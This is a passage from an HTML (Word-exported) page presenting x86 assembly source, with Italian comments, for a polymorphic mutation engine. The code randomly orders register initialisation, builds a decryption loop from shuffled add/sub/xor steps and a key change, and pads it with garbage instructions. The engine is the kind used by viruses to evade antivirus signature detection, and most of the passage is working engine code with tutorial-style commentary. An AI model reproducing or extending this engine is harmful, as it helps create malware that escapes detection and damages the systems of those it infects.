style="mso-spacerun: yes">     </span>word ptr ds:[pre_chk+2],ax<span
style="mso-spacerun: yes">     </span>; vedi sopra<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Nel seguente loop do_pnt_cnt verranno create in sequenza
random le sequenze<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; di inizializzazione:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; - inizializzazione contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; - inizializzazione puntatore codice da decrittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; - inizializzazione chiave (opzionale)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cx,03h<span style="mso-spacerun:
yes">                  </span>; tre operazioni da creare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_pnt_cnt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>si,offset already_pnt<span
style="mso-spacerun: yes">   </span>; pointer, counter, key…<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>bx,si<span
style="mso-spacerun: yes">                   </span>; attenzione a questa
memorizzazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; genera numero random e lo mette in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>and<span
style="mso-spacerun: yes">     </span>al,011b<span style="mso-spacerun:
yes">                 </span>; AND con 3 (11b), il<span style="mso-spacerun:
yes">  </span>numero varia da 0 a 3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,011b<span style="mso-spacerun:
yes">                 </span>; è uguale a tre ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_pnt_cnt<span style="mso-spacerun:
yes">              </span>; sì, allora torna su<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; a questo punto al può essere 0, 1 o 2. Ricordiamo che SI =
offset di already_pnt, a<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; cui seguono already_cnt (+1) e already_key
(+2). </span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>Se tali locazioni contengono 0ffh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; non sono ancora state utilizzate per memorizzare i dati.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>xor<span style="mso-spacerun: yes">     </span>ah,ah<span
style="mso-spacerun: yes">                   </span>; AX = 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>si,ax<span
style="mso-spacerun: yes">                   </span>; in SI = offset
already_pnt + 0 / 1 / 2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[si],0ffh<span style="mso-spacerun: yes">   </span>; abbiamo gia' eseguito
questa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jne<span
style="mso-spacerun: yes">     </span>do_pnt_cnt<span style="mso-spacerun:
yes">              </span>; operazione?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; crea il puntatore alla tabella init_offs che contiene gli
offset alle funzioni di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; inizializzazione. Le funzioni di inizializzazione sono tre, e
vengono chiamate in <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; maniera casuale in base al contenuto di AL, che può essere 0,
2, o 4. AL viene <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; raddoppiato perché gli offset della tabella init_offs sono
costituiti da words</span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>si<span style="mso-spacerun:
yes">                      </span>; preserva SI <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>shl<span
style="mso-spacerun: yes">     </span>al,1<span style="mso-spacerun: yes">   
</span><span style="mso-spacerun: yes">                </span>; *2 come detto
sopra<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>ax,offset init_offs<span
style="mso-spacerun: yes">     </span>; in AX offset tabella con offset
funzioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; AX = 0/2/4<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>ax,word ptr ds:[si]<span
style="mso-spacerun: yes">     </span>; SI = 0/2/4<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>si<span style="mso-spacerun:
yes">               </span><span style="mso-spacerun: yes">       </span>;
ripristina SI<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call<span style="mso-spacerun: yes">    </span>ax<span
style="mso-spacerun: yes">                      </span>; call all’indirizzo di
init_offs<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>next_inits:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>random_garbage<span style="mso-spacerun: yes">          </span>; tra
l'una e l'altra garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>loop<span
style="mso-spacerun: yes">    </span>do_pnt_cnt<span style="mso-spacerun:
yes">              </span>; lo esegue per tre volte (CX = 3) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Adesso la parte di inizializzazione dei registri per il loop
e' pronta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Quindi da qui in avanti sara' creato il loop di decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>word ptr ds:[decr_begin],di<span
style="mso-spacerun: yes">     </span>; segnala inizio loop (indir.inizio)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>random_garbage<span style="mso-spacerun:
yes">                  </span>; scrive qualche istruzione garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Nel seguente loop incdec_pntcnt dobbiamo eseguire le 6
operazioni necessarie<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nel decryption loop e piu' precisamente:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">  </span>- Incrementare il
pointer alla prossima word (Incrementiamo di uno 2 volte)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">  </span>- Decrementare il
counter di due (Decrementiamo di uno 2 volte)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">  </span>- Cambiare la chiave
di crittazione (se la chiave e' usata)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">  </span>- Eseguire
l'operazione matematica di decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Le operazioni vengono svolte in ordine casuale. L'ordine di
certe operazioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; (l'incremento del pointer e il cambio della chiave) pero'
influenza certe<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; altre (operazione matematica di decrittazione) e percio'
dovremo fare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; attenzione proprio a questo in certi casi.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; la routine RC potrebbe essere del tipo, se cx = counter e di =
pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC;mso-ansi-language:
EN-US'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC;mso-ansi-language:
EN-US'>;<span style="mso-spacerun: yes">   </span>loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC;mso-ansi-language:
EN-US'>;<span style="mso-spacerun: yes">      </span>dec <span
style='mso-tab-count:1'> </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>inc<span style="mso-spacerun: yes">  </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>xor<span style="mso-spacerun: yes">  </span>[di],036h<span
style="mso-spacerun: yes">     </span>(puo' essere add/sub/xor e anche con key)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">      </span>dec <span
style='mso-tab-count:1'> </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>inc<span style="mso-spacerun: yes">  </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>cmp<span style="mso-spacerun: yes">  </span>cx,0<span
style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">        </span>(possono essere vari tipi derivati dalla cntr_checks)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>je<span style="mso-spacerun: yes">   </span>esci_dal_loop<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">     
</span>jmp<span style="mso-spacerun: yes">  </span>loop<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<span style="mso-spacerun: yes">  
</span>esci_dal_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; quindi due decrementi del counter, due incrementi
del pointer, una operazione <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; matematica sulla memoria e in piu' il check di fine
loop. in caso venga usato un<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; registro per la chiave di decrittazione allora ci
puo' essere qualche istruzione che <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; modifica l'istruzione (generata dalla routine
do_changekey). Come già detto la sequenza <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; delle varie operazioni non e'fissa. Inoltre tra
un’istruzione e l’altra (tranne il <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>; check finale e il salto indietro ad inzio loop) ci
sono istruzioni garbage. <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cx,06<span style="mso-spacerun:
yes">                   </span>; sei operazioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>incdec_pntcnt:<span style="mso-spacerun:
yes">                         </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>si,offset change_key<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>sorta_random_07<span style="mso-spacerun: yes">         </span>; ricava
un num. casuale tra 0 e 7 in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>and<span
style="mso-spacerun: yes">     </span>al,11b<span style="mso-spacerun:
yes">                  </span>; ora il numero è tra 0 e 3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ricordiamo che:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">         </span>change_key =
cambio chiave<span style="mso-spacerun: yes">      </span>offset 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun:
yes">         </span>dec_cnt<span style="mso-spacerun: yes">    </span>= decr.
contatore<span style="mso-spacerun: yes">    </span>offset change_key + 1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun:
yes">         </span>inc_pnt<span style="mso-spacerun: yes">    </span>= incre.
puntatore<span style="mso-spacerun: yes">   </span>offset change_key + 2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun:
yes">         </span>math_op<span style="mso-spacerun: yes">    </span>= oper.
crittazione<span style="mso-spacerun: yes">  </span>offset change_key + 3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">  </span><span style="mso-spacerun:
yes">   </span>si,ax<span style="mso-spacerun: yes">                   </span>;
offset change_key + 0/1/2/3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[si],02<span style="mso-spacerun: yes">     </span>; gia' fatte due di
queste?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>je<span style="mso-spacerun: yes">      </span>incdec_pntcnt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">      
</span>inc<span style="mso-spacerun: yes">     </span>byte ptr ds:[si]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; crea il puntatore alla tabella loop_offs che contiene gli
offset alle funzioni del<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; loop di decrittazione. Le funzioni sono quattro, e come detto
spra vengono chiamate <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; in maniera (quasi) casuale in base al contenuto di AL, che può
essere 0, 2, 4, o 6. <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; AL viene raddoppiato perché gli offset della tabella sono
costituiti da words<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>si<span style="mso-spacerun:
yes">                      </span>; preserva… <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>shl<span
style="mso-spacerun: yes">     </span>al,1<span style="mso-spacerun:
yes">                    </span>; moltiplica per due per offset word<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>add<span style="mso-spacerun: yes">     </span>ax,offset loop_offs<span
style="mso-spacerun: yes">     </span>; in AX offset tabella con offset
funzioni<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>si,ax<span
style="mso-spacerun: yes">           </span><span style="mso-spacerun:
yes">        </span>; AX = 0/2/4/6<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>ax,word ptr ds:[si]<span
style="mso-spacerun: yes">     </span>; SI = 0/2/4/6<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>si<span style="mso-spacerun:
yes">                      </span>; e ripsristina<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call<span style="mso-spacerun: yes">    </span>ax<span
style="mso-spacerun: yes">                      </span>; call all’indirizzo
loop_offs<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>next_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>call<span style="mso-spacerun: yes">    </span>random_garbage<span
style="mso-spacerun: yes">          </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">     </span>loop<span
style="mso-spacerun: yes">    </span>incdec_pntcnt<span style="mso-spacerun:
yes">           </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Il contenuto del loop di decrittazione e' stato creato. Adesso
dobbiamo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ancora fare il check finale se la decrittazione e' finita e in
base al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; risultato uscire dal loop o rientrarci.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; get_cntrchk crea una delle possibili istruzioni che ci
permettono di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
